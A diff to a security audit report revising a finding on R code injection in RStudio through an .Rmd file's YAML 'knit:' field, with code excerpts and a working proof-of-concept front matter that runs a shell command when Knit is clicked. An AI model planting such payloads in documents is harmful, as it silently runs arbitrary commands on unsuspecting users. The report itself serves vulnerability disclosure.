@@ -367,63 +367,91 @@ Medium — exploitability depends on R-side implementation. Recommend treating a
 
 ### VULN-06 — R Code Injection via RMarkdown `renderFunc` (MEDIUM)
 
-**Trigger:** Rendering a crafted `.Rmd` / `.qmd` file
+**Trigger:** Clicking **Knit** on a crafted `.Rmd` file (NOT simply opening it)
 **Parameter:** `knit:` field in YAML front matter (file-controlled, not direct HTTP param)
-**Source:** `SessionRMarkdown.R:154` → `SessionRMarkdown.cpp:536-539`
-**Sink:** `SessionRMarkdown.cpp:622-623` — embedded into R code string without escaping
-**Type:** R Code Injection via Unsanitized String Interpolation
+**Source:** `SessionRMarkdown.R:170-171` → `SessionRMarkdown.cpp:536-539`
+**Sink:** `SessionRMarkdown.cpp:629` — `renderFunc` embedded unsanitized into the final render command string
+**Type:** R Code Injection via Unsanitized String Interpolation in render command builder
+
+#### Important: Opening the file does nothing
+
+`getCustomRenderFunction()` is only called when the user initiates a Knit/render action. Opening the `.Rmd` in the editor does not parse or execute any YAML-derived R code. The exploit only fires when **Knit is clicked**.
 
 #### Code Path
 
 ```r
-# SessionRMarkdown.R:154 — reads knit: field from YAML front matter
+# SessionRMarkdown.R:154-171 — reads knit: field from YAML; returns raw string, no sanitization
 .rs.addFunction("getCustomRenderFunction", function(file) {
     lines <- readLines(file, warn = FALSE)
     yamlFrontMatter <- rmarkdown:::parse_yaml_front_matter(lines)
     if (is.character(yamlFrontMatter[["knit"]]))
-        yamlFrontMatter[["knit"]][[1]]   # ← returned as renderFunc
-    ...
+        yamlFrontMatter[["knit"]][[1]]   # ← raw string returned as renderFunc
 })
 ```
 
 ```cpp
-// SessionRMarkdown.cpp:619-623
+// SessionRMarkdown.cpp:619-633
+// Step 1: evaluateString() runs the renderFunc string as R code.
+// If it evaluates to a function, the fallback at line 622 is skipped.
+// BUT the C++ string renderFunc is still the raw, unmodified user value.
 error = r::exec::evaluateString(renderFunc, &renderFuncSEXP, &rProtect);
-if (error || !r::sexp::isFunction((renderFuncSEXP)))
+if (error || !r::sexp::isFunction(renderFuncSEXP))
 {
-    // renderFunc is NOT a valid R function — fall back to system() wrapper
-    // renderFunc is embedded directly with %1% — NO single-quote escaping applied here
+    // Fallback path (line 622) — only taken if renderFunc is NOT a function
     boost::format fmt("(function(input, ...) { invisible(system(paste0('%1% \"', input, '\" ', '%2%'))) })");
     renderFunc = boost::str(fmt % renderFunc % extraArgs);
-    //                             ^^^^^^^^^
-    //                             Unescaped — single quotes in renderFunc break out of paste0()
 }
+
+// Step 2: renderFunc (still the raw user string when a function was found) is embedded
+// DIRECTLY into the final render command — no escaping applied to renderFunc here.
+// singleQuotedStrEscape() is applied to targetFile (line 631) but NOT to renderFunc.
+boost::format fmt2("%1%('%2%', %3% %4%);");
+std::string cmd = boost::str(fmt2 %
+                     renderFunc %                                    // ← unsanitized
+                     string_utils::singleQuotedStrEscape(targetFile) %
+                     extraParams %
+                     renderOptions);
+// cmd is then evaluated in the R session to perform the render
 ```
 
-Note: `singleQuotedStrEscape()` is applied to `targetFile` (line 631) but **not** to `renderFunc`.
+#### Why the Fallback Is a Red Herring
+
+When the `knit:` payload is `"system('...'); knitr::knit"`:
+
+1. `evaluateString("system('...'); knitr::knit")` evaluates the R expression:
+   - `system('...')` executes (side-effect at eval time)
+   - Returns `knitr::knit`, which IS a function
+2. `isFunction()` → `TRUE` → **fallback at line 622 is skipped**
+3. The C++ `renderFunc` string is unchanged: `"system('...'); knitr::knit"`
+4. This is substituted directly into `cmd` at line 629:
+   ```r
+   system('touch /tmp/pwned'); knitr::knit('/path/to/file.Rmd', encoding = 'UTF-8' );
+   ```
+5. R evaluates `cmd` → `system()` executes, then normal knit proceeds
+
+The injection vector is **line 629 (`%1%` substitution into cmd)**, not the fallback at line 622.
 
 #### Exploit
 
-Create `.Rmd` with crafted `knit:` field:
-
+Create `.Rmd`:
 ```yaml
 ---
-title: "Exploit"
-knit: "system('id > /tmp/pwned'); knitr::knit"
+title: "test"
+output: html_document
+knit: "system('touch /tmp/pwned'); knitr::knit"
 ---
+test
 ```
 
-1. `getCustomRenderFunction()` returns `system('id > /tmp/pwned'); knitr::knit`
-2. `evaluateString()` — this is a valid expression (not a bare function), so it may fail the `isFunction()` check depending on evaluation
-3. If `!isFunction`, the fallback embeds it into:
-   ```r
-   (function(input, ...) { invisible(system(paste0('system('id > /tmp/pwned'); knitr::knit "', input, ...))) })
-   ```
-   The embedded single quote breaks the `paste0()` call, injecting arbitrary R code.
+1. Open file in RStudio
+2. Click **Knit**
+3. Check `/tmp/pwned` — file will be created
+
+The document renders normally (knit proceeds after the injected command), so the victim sees no error.
 
 #### Impact
 
-A user who opens/renders a maliciously crafted Rmd file triggers execution of arbitrary R code as themselves. In a collaborative or shared environment (e.g., a shared project), this is a meaningful escalation path.
+Any `.Rmd` opened and knitted by a victim executes arbitrary shell commands as that user's process. In a collaborative environment (shared projects, code review, teaching), a malicious contributor can embed this silently in a legitimate-looking document.
 
 ---
 
